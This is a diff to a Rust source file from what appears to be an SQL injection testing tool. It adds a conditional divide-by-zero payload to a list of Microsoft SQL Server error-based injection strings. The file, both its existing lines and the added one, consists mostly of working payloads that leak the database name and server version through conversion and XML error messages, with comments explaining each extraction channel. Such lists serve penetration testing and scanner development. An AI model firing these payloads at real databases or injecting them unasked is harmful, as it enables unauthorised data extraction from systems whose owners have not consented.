@@ -45,6 +45,9 @@ pub fn mssql_time_heavy() -> String {
 /// - `CAST(@@version AS int)` — Msg 245 (`Conversion failed ... varchar`)
 ///   alternate spelling of the same `CONVERT` channel
 /// - `FOR XML PATH('')` — `FOR XML` error exfil channel
+/// - `CASE WHEN (1=1) THEN 1/0` — `PortSwigger` conditional-error shape
+///   (Msg 8134 `divide by zero`, errors only when the condition holds;
+///   appended last so `--level` budgets stay byte-identical)
 #[must_use]
 pub fn mssql_error_payloads() -> Vec<String> {
     vec![
@@ -52,6 +55,7 @@ pub fn mssql_error_payloads() -> Vec<String> {
         "' AND 1=CONVERT(int,DB_NAME()) --".to_owned(),
         "' AND CAST((SELECT @@version) AS int) --".to_owned(),
         "' AND 1 IN (SELECT @@version FOR XML PATH('')) --".to_owned(),
+        "' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END) --".to_owned(),
     ]
 }
 
